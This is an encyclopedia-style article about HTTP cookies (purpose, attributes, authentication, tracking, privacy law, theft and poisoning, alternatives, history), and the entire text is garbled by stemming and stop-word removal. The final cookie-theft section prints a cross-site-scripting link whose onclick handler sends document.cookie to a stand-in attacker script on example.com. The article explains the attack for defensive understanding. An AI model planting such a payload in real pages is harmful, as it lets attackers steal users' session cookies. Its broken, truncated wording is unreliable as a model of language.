http cooki , sometim known web cooki cooki , parcel text sent server web browser sent back unchang browser time access server . http cooki use authent , track , maintain specif inform user , site prefer content electron shop cart . term `` cooki '' deriv `` magic cooki , '' well-known concept unix comput inspir idea name http cooki . cooki concern internet privaci , sinc use track brows behaviour . result , subject legisl variou countri unit state european union . cooki also criticis identif user provid alway accur could potenti use network attack . altern cooki exist , drawback . cooki also subject number misconcept , mostli base erron notion comput program . fact , cooki simpl piec data unabl perform oper . particular , neither spywar viru , despit detect cooki certain site mani anti-spywar product . modern browser allow user decid whether accept cooki , reject make websit unus . exampl , shop basket implement use cooki work cooki reject . # # purpos cooki use web server differenti user oper way depend user . cooki invent realis virtual shop basket : virtual devic user `` place '' item purchas , user navig site item shown , ad remov item shop basket time . cooki allow content shop cart depend user 's action . allow user log websit anoth use cooki . user typic log insert credenti login page ; cooki allow server know user alreadi authent , therefor allow access servic perform oper restrict logged-in user . sever websit also use cooki person base user ' prefer . site requir authent often use featur , although also present site requir authent . person includ present function . exampl , wikipedia web site allow authent user choos webpag skin like best ; googl search engin allow user ( even non-regist one ) decid mani search result per page want see . cooki also use track user across websit . third-parti cooki web bug , explain , also allow track across multipl site . track within site typic done aim produc usag statist , track across site typic use advertis compani produc anonym user profil , use target advertis ( decid advertis imag show ) base user profil . # # realiz technic , cooki arbitrari piec data chosen web server sent browser . browser return unchang server , introduc state ( memori previou event ) otherwis stateless http transact . without cooki , retriev web page compon web page isol event , mostli unrel view page site . return cooki web server , browser provid server mean connect current page view prior page view . set web server , cooki also set script languag javascript , support enabl web browser . cooki specif suggest browser support minim number cooki amount memori store . particular , internet browser expect abl store least 300 cooki 4 kilobyt , least 20 cooki per server domain . cooki setter specifi delet date , case cooki remov date . cooki setter specifi date , cooki remov user quit browser . result , specifi date way make cooki surviv across session . reason , cooki expir date call persist . exampl applic , shop site use persist cooki store item user place basket . way , user quit browser without make purchas return later , n't find product previous place shop cart . # # misconcept sinc introduct internet , misconcept cooki circul internet medium . 2005 , jupit research publish result survey , accord consist percentag respond believ follow claim : myth : cooki like worm viru eras data user 's hard disk ; myth : cooki form spywar read person inform store user 's comput ; myth : cooki gener popup ; myth : cooki use spam ; myth : cooki use advertis . cooki fact data , program code : eras read inform user 's comput . howev , cooki allow detect web page view user given site set site . inform collect profil user . profil often anonym , , contain person inform user ( name , address , etc . ) precis , contain person inform unless user made avail site . even anonym , profil subject privaci concern . accord survey , larg percentag internet user know delet cooki . # # browser set modern browser support cooki . howev , user usual also choos whether cooki use . follow common option : ( 1 ) cooki never accept , ( 2 ) browser ask user whether accept everi individu cooki , ( 3 ) cooki alway accept . browser may also includ possibl better specifi cooki accept . particular , user typic choos one follow option : reject cooki specif domain ; disallow third-parti cooki ( see ) ; accept cooki non-persist ( expir browser close ) ; allow server set cooki differ domain . addit , browser may also allow user view delet individu cooki . browser support javascript allow user see cooki activ respect given page type javascript : alert ( `` cooki : `` +document.cooki ) browser url field . browser incorpor cooki manag user see select delet cooki current store browser . p3p specif includ possibl server state privaci polici , specifi kind inform collect purpos . polici includ ( limit ) use inform gather use cooki . accord p3p specif , browser accept reject cooki compar privaci polici store user prefer ask user , present privaci polici declar server . # # privaci third-parti cooki cooki import implic privaci anonym web user . cooki sent server set one internet domain , web page may contain imag compon store server domain . cooki set retriev compon call third-parti cooki . advertis compani use third-parti cooki track user across multipl site . particular , advertis compani track user across page place advertis imag web bug . knowledg page visit user allow advertis compani target advertis user 's presum prefer . possibl build profil user consid potenti privaci threat , even track done singl domain especi track done across multipl domain use third-parti cooki . reason , countri legisl cooki . unit state govern set strict rule set cooki 2000 disclos white hous drug polici offic use cooki track comput user view onlin anti-drug advertis see visit site drug make drug use . 2002 , privaci activist daniel brandt found cia leav persist cooki comput ten year . notifi violat polici , cia state cooki intent set stop set . decemb 25 , 2005 , brandt discov nation secur agenc leav two persist cooki visitor ' comput due softwar upgrad . inform , nation secur agenc immedi disabl cooki . 2002 european union telecommun privaci direct contain rule use cooki . particular , articl 5 , paragraph 3 direct mandat store data ( like cooki ) user 's comput done : 1 ) user provid inform data use ; 2 ) user given possibl deni store oper . howev , articl also state store data necessari technic reason exempt rule . direct expect appli sinc octob 2003 , decemb 2004 report say ( page 38 ) provis appli practic , member countri ( slovakia , latvia , greec , belgium , luxembourg ) even transpos . report suggest thorough analysi situat member state . # # drawback cooki besid privaci concern , reason cooki oppos : alway accur identifi user , use secur attack . # # # inaccur identif one browser use comput , separ storag area cooki . henc cooki identifi person , combin user account , comput , web browser . thu , anyon us multipl account , comput , browser multipl set cooki . likewis , cooki differenti multipl user share comput browser , use differ user account . # # # cooki theft normal oper , cooki sent back forth server ( group server domain ) comput brows user . sinc cooki may contain sensit inform ( user name , token use authent , etc . ) , valu access comput . cooki theft process allow unauthoris parti receiv cooki . cooki sent ordinari http session visibl user listen network use packet sniffer . problem overcom use http uri scheme , invok transport layer secur encrypt connect . addit , cooki set secur flag , make sent secur channel , ssl connect . differ way steal cooki cross-sit script , make browser send cooki server receiv . modern browser allow execut piec code retriev server . cooki access execut , valu may commun form server access . process allow unauthoris parti receiv cooki call cooki theft , encrypt help attack .. possibl typic exploit attack site allow user post html content . embed suitabl piec code html post , attack may receiv cooki user . knowledg cooki exploit connect site use stolen cooki , thu recognis user whose cooki stolen . way prevent attack httponli flag ; microsoft-specif option make cooki inaccess client side script . # # # cooki poison cooki suppos store sent back server unchang , attack may modifi valu cooki send back server . , exampl , cooki contain total valu user pay item shop basket , chang valu expos server risk make attack pay less suppos price . process tamper valu cooki call cooki poison , sometim use cooki theft make attack persist . websit , howev , store session identifi — randomli gener uniqu number use identifi user 's session — cooki , inform store server . case , problem cooki poison larg elimin . # # # cross-sit cook site suppos cooki , site like evil.net abl alter set cooki anoth site , like good.net . cross-sit cook vulner web browser allow malici site break rule . similar cooki poison , attack exploit non-malici user vulner browser , instead attack actual site directli . goal attack may perform session fixat . # # altern cooki oper realis use cooki also realis use mechan . howev , altern cooki drawback , make cooki usual prefer practic . follow altern allow user track , even reliabl cooki . result , privaci issu even cooki reject browser set server . # # # ip address unreli techniqu track user base store ip address comput request page . techniqu avail sinc introduct world wide web , download page requir server hold know ip address comput run browser proxi , use . inform avail server store regardless whether cooki use . howev , address typic less reliabl identifi user cooki comput proxi may share sever user , comput may assign differ internet address differ work session ( often case dial-up connect ) . reliabl techniqu improv use anoth featur http protocol : browser request page user follow link , request sent server contain url page link locat . server store url , path page view user track precis . howev , trace less reliabl one provid cooki , sever user may access page comput , nat router , proxi follow two differ link . moreov , techniqu allow track replac cooki us . track ip address imposs system use retain internet anonym , tor . system , could one browser carri multipl address throughout session , multipl user could appear come ip address , thu make ip address use track wholli unreli . major isp , includ aol , rout web traffic small number proxi make scheme particularli unwork . # # # url ( queri string ) precis techniqu base embed inform url . queri string part url one typic use purpos , part use well . php session mechan us method cooki enabl . method consist web server append queri string link web page hold send browser . user follow link , browser return attach queri string server . queri string use way cooki similar , arbitrari piec inform chosen server sent back browser . howev , differ : sinc queri string part url , url later reus , attach piec inform sent server . exampl , prefer user encod queri string url user send url anoth user e-mail , prefer use user well . moreov , even user access page two time , guarante queri string use view . exampl , user arriv page come page intern site first time extern search engin second time , rel queri string typic differ cooki would . detail , see queri string . drawback queri string relat secur : store data identifi session queri string enabl simplifi session fixat attack , refer log attack secur exploit . transfer session identifi http cooki secur . # # # http authent authent , http protocol includ mechan , digest access authent , allow access web page user provid correct usernam password . credenti given , browser store us also access subsequ page , without requir user provid . point view user , effect cooki use : usernam password request , point user given access site . background , usernam password combin sent server everi browser request . mean someon listen traffic , simpli read inform store later use . session token hand , usual expir use , thu effect becom useless ( i.e . use retriev session user logged-in ) . # # # client-sid persist web browser support script-bas persist mechan allow page store inform local later retriev . internet explor , exampl , support persist inform browser 's histori , favorit , xml store , directli within web page save disk . javascript enabl , window.nam properti object window use persist store data . properti remain unalt across load unload web page . hack littl known , therefor consid secur risk . addit , window.nam introduc browser compat issu , mozilla-bas browser mozilla firefox support javascript persist use window.nam . # # histori term `` http cooki '' deriv `` magic cooki '' , packet data program receiv us send , possibl origin , unchang . magic cooki alreadi use comput lou montulli idea use web commun june 1994 . time , employe netscap commun , develop e-commerc applic custom . cooki provid solut problem reliabl implement virtual shop cart . togeth john giannandrea , montulli wrote initi netscap cooki specif year . version 0.9beta netscap , releas septemb 1994 , support cooki . first actual use cooki ( lab ) made check whether visitor netscap web site alreadi visit site . montulli giannandrea appli patent cooki technolog 1995 ; grant 1998 . support cooki integr internet explor version 2 , releas octob 1995 . introduct cooki wide known public , time . particular , cooki accept default , user notifi presenc cooki . peopl awar exist cooki earli first quarter 1995 , gener public learn financi time publish articl februari 12 , 1996 . year , cooki receiv lot medium attent , especi potenti privaci implic . cooki discuss two u.s. feder trade commiss hear 1996 1997 . develop formal cooki specif alreadi ongo . particular , first discuss formal specif start april 1995 www-talk mail list . special work group within ietf form . two altern propos introduc state http transact propos brian behlendorf david kristol , respect , group , head kristol , soon decid use netscap specif start point . februari 1996 , work group identifi third-parti cooki consider privaci threat . specif produc group eventu publish rfc 2109 februari 1997 . specifi third-parti cooki either allow , least enabl default . time , advertis compani alreadi use third-parti cooki . recommend third-parti cooki rfc 2109 follow netscap internet explor . rfc 2109 follow rfc 2965 octob 2000 . # # implement # # # set cooki transfer web page follow hypertext transfer protocol ( http ) . regardless cooki , browser request page web server send short text call http request . exampl , access page http : //www.w3.org/index.html , browser connect server www.w3.org send request look like follow one : server repli send request page preced similar packet text , call http header . packet may contain line request browser store cooki : line set-cooki sent server wish browser store cooki . inde , request browser store string name=valu send back futur request server . browser support cooki cooki enabl , everi subsequ page request server contain cooki . exampl , browser request page http : //www.w3.org/spec.html send server www.w3.org request like follow : request anoth page server , differ first one contain string server previous sent browser . way , server know request relat previou one . server answer send request page , possibl ad cooki well . valu cooki modifi server send new set-cooki : name=newvalu line respons page request . browser replac old valu new one . set-cooki line typic creat http server cgi program . http server send result program ( document preced header contain cooki ) browser . cooki also set javascript similar script run within browser . javascript , object document.cooki use purpos . exampl , instruct document.cooki = `` temperature=20 '' creat cooki name temperatur valu 20 . # # # cooki attribut besid name/valu pair , cooki may also contain expir date , path , domain name , whether cooki intend encrypt connect . rfc 2109 also specifi cooki must mandatori version number , usual omit . piec data follow name=newvalu pair separ semicolon . exampl , cooki creat server send line set-cooki : name=newvalu ; expires=d ; path=/ ; domain=.example.org . domain path tell browser cooki sent back server request url given domain path . specifi , default domain path object request . result , domain path string may tell browser send cooki normal would . secur reason , cooki accept server member domain specifi domain string . cooki actual identifi tripl name/domain/path , name ( origin netscap specif consid pair name/path ) . word , name differ domain path identifi differ cooki possibl differ valu . result , cooki valu chang new valu given name , domain , path . expir date tell browser delet cooki . expir date provid , cooki delet end user session , , user quit browser . result , specifi expir date mean make cooki surviv across browser session . reason , cooki expir date call persist . expir date specifi `` wdi , dd-mon-yyyy hh : mm : ss gmt '' format . exampl , follow cooki sent web server ( valu string chang ) : set-cooki : rmid=732423sdfs73242 ; expires=fri , 31-dec-2010 23:59:59 gmt ; path=/ ; domain=.example.net name particular cooki rmid , valu string 732423sdfs73242 . server use arbitrari string valu cooki . server may collaps valu number variabl singl string , like exampl a=12 & b=abcd & c=32 . path domain string / .example.net tell browser send cooki request arbitrari page domain .example.net , arbitrari path . # # # expir cooki expir , therefor sent browser server , condit : end user session ( i.e . browser shut ) cooki persist expir date specifi , pass expir date cooki chang ( server script ) date past browser delet cooki user request third condit allow server script explicitli delet cooki . # # # authent cooki use server recogn authent user person web page site depend prefer user . done exampl follow : user insert usernam password text field login page send server ; server receiv usernam password check ; correct , send back page confirm log success togeth cooki , store pair user/cooki ( cooki ) ; everi time user request page server , browser automat send cooki back server ; server compar cooki store one ; match found , server know user request page . method commonli use mani site allow log , yahoo ! wikipedia . # # # person cooki use allow user express prefer web site . exampl , googl search engin allow user choos mani result shown everi queri , choic maintain across session . user authent use techniqu , request page server also sent cooki associ user . therefor adapt request page store use prefer . authent use , user prefer store cooki . user select prefer enter web form submit server . server encod cooki send back browser . way , everi time user access page , server also sent cooki prefer store , personalis page accord user prefer . exampl , googl store user prefer cooki name pref . cooki creat default valu user access site first time . exampl , cooki valu contain string nr=10 , indic default prefer ten hit display page . user chang number 20 prefer page , server modifi cooki nr=20 . everi time user queri search engin , cooki sent server along queri . way , server know mani hit shown page . # # # track cooki also use track path user visit web page site . also done part use ip address comput request page refer field http header , cooki allow greater precis . done exampl follow : user request page site , request contain cooki , server presum first page visit user ; server creat random string send cooki back browser togeth request page ; point , cooki automat sent browser server everi time new page site request ; server send page usual , also store url request page along date/tim cooki log file . look log file , possibl find page , sequenc , user visit . exampl , log contain request done use cooki id=dfhsiw , request come user . url time/d store cooki allow find page user visit , time . # # # third-parti cooki imag object contain web page may resid server differ one hold page . order show page , browser download object , possibl receiv cooki . cooki call third-parti cooki server send locat outsid domain web page . condit common on-lin advertis . inde , web banner typic store server advertis compani , domain web page show . third-parti cooki reject browser , advertis compani track user across site place banner . particular , whenev user view page contain banner , browser retriev banner server advertis compani . server previous set cooki , browser send back , allow advertis compani link access previou one . choos uniqu banner url everi web page place use http refer field , advertis compani find page user view . techniqu use web bug . , unlik obviou banner , imag embed web page undetect user ( e.g . tini and/or transpar ) third-parti cooki use creat anonym profil user . allow advertis compani select banner show user base user 's profil . advertis industri alway deni use profil . mani modern browser , internet explor , opera mozilla firefox , block third parti cooki request user . internet explor version 6 allow mild form block , call leash . leash cooki third-parti cooki sent browser access third-parti document via first-parti . exampl , third.com set cooki imag request , imag set first time user view document first.com , cooki sent user download document contain imag document anoth site other.com , cooki leash . leash cooki differ block cooki sent , exampl , imag contain anoth document site first.com . # # # basket onlin shop site allow user , even log , store number item `` virtual basket '' . user start navig site empti basket , add item basket visit site . list item user chosen store use cooki . exampl , server send empti cooki browser user visit first page ; whenev user add item basket , server add name item cooki . insecur mechan , malici user alter cooki ; much secur mechan gener random cooki `` track '' , use lookup key databas store server . # # # cooki theft cooki specif constrain cooki sent back server domain server origin . howev , valu cooki sent server use mean differ cooki header . particular , script languag javascript jscript usual allow access cooki valu mean send arbitrari valu arbitrari server internet . fact use combin site allow user post html content user see . exampl , attack run domain example.com may post comment contain follow link popular blog otherwis control : < href= '' # '' onclick= '' window.location='http : //example.com/stole.cgi ? text='+escap ( document.cooki ) ; return fals ; '' > click ! < /a > anoth user click link , browser execut piec code within onclick attribut , thu replac string document.cooki list cooki activ page . result , list cooki sent example.com server , attack abl collect cooki user . type attack difficult detect user side , sinc script come domain set cooki , oper send valu appear authoris domain . usual consid respons administr run site user post disallow post malici code .